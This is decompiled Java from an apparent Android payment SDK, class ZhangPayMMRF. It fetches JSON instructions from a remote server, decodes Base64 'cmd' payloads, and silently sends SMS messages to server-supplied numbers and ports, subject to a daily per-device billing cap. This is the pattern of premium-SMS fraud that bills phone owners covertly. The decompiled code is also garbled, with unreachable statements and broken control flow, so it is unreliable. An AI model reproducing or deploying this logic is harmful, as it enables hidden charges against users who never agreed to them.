package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import android.util.Base64;
import com.waterwest.mmlog.TrustInfo;
import com.zhangzhifu.sdk.db.MMRWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.MMRProcedure;
import com.zhangzhifu.sdk.modle.MMRWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.SendSMS;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.List;
import org.apache.http.HttpResponse;
import org.json.JSONException;
import org.json.JSONObject;

public class ZhangPayMMRF
{
  public static int allFlow;
  private static ZhangPayMMRF ap;
  public static String currentWapUrl;
  private Context ao;
  private String aq;
  private boolean ar = false;
  private String as = null;
  private HttpResponse at = null;
  private MMRProcedure au;
  private String av = null;
  private String contentsid = null;
  public int count;
  public boolean isSend = false;
  public boolean isSendNext = false;
  
  public ZhangPayMMRF(Context paramContext)
  {
    this.ao = paramContext;
  }
  
  private String a(Context paramContext, String paramString)
  {
    String str1 = null;
    JSONObject localJSONObject = null;
    Object localObject = Tools.getContentByCMWAP(paramString + "&contentid=" + this.contentsid, Tools.getHeadersByDefault(paramContext, null, null), paramContext);
    paramString = localJSONObject;
    if (localObject != null)
    {
      localObject = Tools.getBody((HttpResponse)localObject, paramContext);
      paramString = localJSONObject;
      if (localObject == null) {}
    }
    try
    {
      localJSONObject = new JSONObject((String)localObject);
      paramString = localJSONObject.getString("resultCode");
      String str2;
      String str3;
      String str4;
      return paramString;
    }
    catch (JSONException paramContext)
    {
      try
      {
        if (!paramString.equals("000")) {
          return paramString;
        }
        str1 = localJSONObject.getString("appid");
        localObject = localJSONObject.getString("sdkVersion");
        str2 = localJSONObject.getString("versionCode");
        str3 = localJSONObject.getString("packageName");
        str4 = localJSONObject.getString("channel");
        TrustInfo.init(paramContext, (String)localObject, str1, localJSONObject.getString("channelId"), localJSONObject.getString("programId"), localJSONObject.getString("versionName"), str2, str3, localJSONObject.getString("app_md5"), str4);
        return paramString;
      }
      catch (JSONException paramContext)
      {
        for (;;) {}
      }
      paramContext = paramContext;
      paramString = str1;
      paramContext.printStackTrace();
      return paramString;
    }
  }
  
  private String b(Context paramContext, String paramString)
  {
    Object localObject1 = null;
    String str1 = null;
    try
    {
      Object localObject2 = Tools.getContentByCMWAP(paramString + "&contentid=" + this.contentsid, Tools.getHeadersByDefault(paramContext, null, null), paramContext);
      paramString = (String)localObject1;
      if (localObject2 == null) {
        return paramString;
      }
      localObject2 = Tools.getBody((HttpResponse)localObject2, paramContext);
      paramString = (String)localObject1;
      if (localObject2 == null) {
        return paramString;
      }
      localObject3 = new JSONObject((String)localObject2);
      paramString = ((JSONObject)localObject3).getString("resultCode");
      try
      {
        if (!paramString.equals("0000")) {
          return paramString;
        }
        this.contentsid = ((JSONObject)localObject3).getString("contentsid");
        localObject2 = ((JSONObject)localObject3).getString("smstype");
        localObject1 = ((JSONObject)localObject3).getString("cmd");
        str1 = ((JSONObject)localObject3).getString("port");
        String str2 = ((JSONObject)localObject3).getString("init_sms");
        String str3 = ((JSONObject)localObject3).getString("init_sms_number");
        String str4 = ((JSONObject)localObject3).getString("pay_code");
        String str5 = ((JSONObject)localObject3).getString("package_name");
        String str6 = ((JSONObject)localObject3).getString("version_type");
        String str7 = ((JSONObject)localObject3).getString("version_code");
        String str8 = ((JSONObject)localObject3).getString("version_name");
        String str9 = ((JSONObject)localObject3).getString("app_id");
        String str10 = ((JSONObject)localObject3).getString("channel_id");
        String str11 = ((JSONObject)localObject3).getString("program_id");
        String str12 = ((JSONObject)localObject3).getString("esm");
        String str13 = ((JSONObject)localObject3).getString("mdh");
        String str14 = ((JSONObject)localObject3).getString("pkm");
        String str15 = ((JSONObject)localObject3).getString("tid");
        String str16 = ((JSONObject)localObject3).getString("timestamp");
        String str17 = ((JSONObject)localObject3).getString("sda");
        String str18 = ((JSONObject)localObject3).getString("channel");
        localObject3 = ((JSONObject)localObject3).getString("app_md5");
        if ((str5 == "") || (str11 == "")) {
          return paramString;
        }
        TrustInfo.auth(paramContext, str5, str7, str8, str9, str4, str15, str6, str10, str11, str16, str12, str13, str14, str17, (String)localObject3, str18);
        localObject3 = new SendSMS();
        if (!((String)localObject2).equals("1")) {
          break label439;
        }
        if (str2 != "") {
          ((SendSMS)localObject3).sendSMS(paramContext, str3, str2, null);
        }
        try
        {
          Thread.sleep(2000L);
          localObject1 = Base64.decode((String)localObject1, 0);
          System.out.println("MMR已经发短信smsData");
          ((SendSMS)localObject3).sendSMS(paramContext, str1, null, (byte[])localObject1);
          SharePreferUtil.setSendSMSMMQ(paramContext, 1);
          return paramString;
        }
        catch (InterruptedException localInterruptedException)
        {
          for (;;)
          {
            localInterruptedException.printStackTrace();
          }
        }
        paramContext.printStackTrace();
      }
      catch (JSONException paramContext) {}
    }
    catch (JSONException paramContext)
    {
      for (;;)
      {
        Object localObject3;
        label439:
        paramString = str1;
      }
    }
    return paramString;
    if (localInterruptedException.equals("0"))
    {
      localObject1 = new String(Base64.decode(((String)localObject1).toString(), 0));
      System.out.println("MMR已经发短信smsText");
      ((SendSMS)localObject3).sendSMS(paramContext, str1, (String)localObject1, null);
      SharePreferUtil.setSendSMSMMQ(paramContext, 1);
      return paramString;
    }
    return paramString;
  }
  
  public static ZhangPayMMRF getInstance(Context paramContext)
  {
    if (ap == null) {
      ap = new ZhangPayMMRF(paramContext);
    }
    return ap;
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      MMRWap localMMRWap = (MMRWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.ao)) {
        break;
      }
      if (localMMRWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localMMRWap.getAllProcedure() != null) && (localMMRWap.getAllProcedure().size() != 0))
      {
        new a(this, localMMRWap).execute(new String[] { "" });
        MMRWapDBManager.getInstance().delWapById(this.ao, localMMRWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.ao, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
}
